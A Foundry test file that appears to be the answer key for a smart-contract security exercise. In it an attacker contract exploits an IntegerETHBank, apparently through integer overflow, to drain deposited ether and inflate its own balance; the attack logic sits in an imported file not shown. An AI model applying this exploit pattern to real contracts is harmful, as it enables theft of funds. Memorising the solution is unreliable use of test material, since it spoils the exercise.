// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.7.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

import "../../src/IntegerETHBank.sol";
import "../ExampleUser.sol";
import "./Attack.sol";

contract IntegerETHBankSolution is Test {
    uint256 constant USER_INITIAL_ETH_BALANCE = 101 ether;
    uint256 constant ATTACKER_INITIAL_ETH_BALANCE = 1 ether;

    IntegerETHBank internal integerETHBank;
    address internal attacker = makeAddr("attacker");
    ExampleUser internal user;

    function setUp() public {
        integerETHBank = new IntegerETHBank();
        user = new ExampleUser();

        deal(address(user), USER_INITIAL_ETH_BALANCE);
        deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);
        vm.prank(address(user));
        integerETHBank.deposit{value: 100e18}();

        vm.label(address(user), "USER");
        vm.label(attacker, "ATTACKER");
        vm.label(address(integerETHBank), "BANK");
    }

    function testExploit() public {
        address attackContract;
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Attack attack = new Attack(address(integerETHBank));
        address(attack).call{value: 1 ether}("");
        attack.attack();
        attackContract = address(attack);
        /**
         * EXPLOIT END *
         */
        validation(attackContract);
    }

    function validation(address attackContract) internal {
        assertLt(address(integerETHBank).balance, 1 ether);
        assertGt(integerETHBank.balanceOf(attackContract), type(uint256).max / 1e18);
    }
}
